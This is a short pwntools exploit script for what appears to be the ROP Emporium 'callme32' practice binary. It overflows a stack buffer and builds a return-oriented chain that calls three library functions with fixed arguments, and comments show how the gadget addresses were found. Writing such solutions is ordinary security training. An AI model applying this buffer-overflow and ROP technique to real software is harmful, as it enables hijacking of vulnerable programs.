from pwn import *
context.log_level = 'debug'
# sh = gdb.debug('./callme32')
sh = process("./callme32")
pop3_ret =  0x80488a9   # objdump -d callme32| grep -A 3 pop
callme_one = 0x080485c0     # rabin2 -i callme32 | grep callme
callme_two = 0x08048620
callme_three = 0x080485b0
arg = p32(1) + p32(2) + p32(3)
sh.recv()
payload = flat(b'a' * 0x2c, callme_one, pop3_ret, arg, callme_two, pop3_ret, arg, callme_three, pop3_ret, arg) 
sh.sendline(payload)
sh.recv()